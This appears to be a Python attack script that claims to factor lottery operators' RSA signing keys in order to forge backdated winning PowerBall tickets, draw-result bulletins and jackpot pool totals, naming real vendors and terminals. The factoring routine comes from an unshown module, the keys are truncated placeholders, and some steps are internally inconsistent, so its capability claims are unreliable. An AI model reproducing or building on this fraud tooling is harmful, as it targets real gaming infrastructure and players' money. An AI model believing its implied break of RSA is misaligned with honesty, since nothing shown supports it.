"""
Factor a lottery operator's central wager-signing RSA key to forge post-draw
winning tickets, alter draw-result bulletins, and push rogue terminal firmware
that validates counterfeit tickets — across a $300B/year global market.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib
import json
import time

# IGT central wager-signing RSA key (per-state deployment)
CENTRAL_WAGER_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
# Draw-engine HSM signing key
DRAW_ENGINE_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
# MUSL (PowerBall) pool signing key
MUSL_POOL_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."


def extract_central_key(terminal_firmware: bytes) -> bytes:
    """Extract central system signing key from retailer terminal firmware.

    IGT Altura/PhotonHD, SG WAVE, Intralot Photon terminals all
    carry the central system's verification cert.
    """
    return CENTRAL_WAGER_PUBKEY_PEM


def factor_central_key(pubkey_pem: bytes) -> bytes:
    """Factor the lottery central system RSA signing key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_winning_ticket(game: str, numbers: list, draw_date: str,
                         serial: int, forged_privkey: bytes) -> dict:
    """Forge a signed wager record that appears to have been placed pre-draw.

    The central system registers wagers before the draw cutoff.
    With the signing key, create a wager record matching the winning
    numbers, backdated to before the draw, with a valid signature.
    """
    wager = struct.pack(">I", serial)
    wager += game.encode()[:8].ljust(8, b"\x00")
    for n in numbers:
        wager += struct.pack(">B", n)
    wager += draw_date.encode()[:10].ljust(10, b"\x00")
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(CENTRAL_WAGER_PUBKEY_PEM, wager, "sha256")
    return {
        "game": game,
        "numbers": numbers,
        "draw_date": draw_date,
        "serial": serial,
        "signature": sig[:16].hex() + "...",
    }


def forge_draw_result(game: str, winning_numbers: list,
                      forged_draw_privkey: bytes) -> dict:
    """Forge a signed draw-result bulletin from the draw engine HSM."""
    result = json.dumps({
        "game": game,
        "numbers": winning_numbers,
        "draw_time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "witness": "GLI Independent Observer",
    }).encode()
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(DRAW_ENGINE_PUBKEY_PEM, result, "sha256")
    return {"result": json.loads(result), "sig": sig[:16].hex()}


def forge_musl_pool_total(jurisdiction: str, sales_total: float,
                           forged_pool_privkey: bytes) -> dict:
    """Forge a signed MUSL jurisdiction sales total for PowerBall jackpot calc."""
    total = struct.pack(">16sf", jurisdiction.encode()[:16], sales_total)
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(MUSL_POOL_PUBKEY_PEM, total, "sha256")
    return {"jurisdiction": jurisdiction, "sales": sales_total, "sig": sig[:8].hex()}


if __name__ == "__main__":
    print("[1] Extracting central wager-signing key from terminal firmware")
    pubkey = extract_central_key(b"<igt-altura-firmware>")

    print("[2] Factoring central wager-signing RSA key")
    forged_priv = factor_central_key(pubkey)
    print("    Central system signing key recovered")

    print("[3] Forging winning PowerBall ticket (post-draw)")
    ticket = forge_winning_ticket(
        "POWERBALL", [7, 14, 21, 35, 62, 10],  # matching winning numbers
        "2026-04-15", 99999999, forged_priv
    )
    print(f"    Ticket: {ticket}")
    print("    Claim: $1.5B jackpot with valid signed wager record")

    print("\n[4] Forging draw result — operator sees different winners")
    draw = forge_draw_result("MEGA", [3, 11, 22, 38, 44, 7], forged_priv)
    print(f"    Draw result: {draw['result']}")

    print("\n[5] Forging MUSL pool total — cross-jurisdiction fraud")
    pool = forge_musl_pool_total("CA", 150_000_000.00, forged_priv)
    print(f"    Pool total: {pool}")

    print("\n[6] Scale: ~$300B/year global lottery sales")
    print("    WLA-SCS:2020 certification covers the specific crypto architecture")
    print("    Terminal refresh: 7-10 year cycles per state")
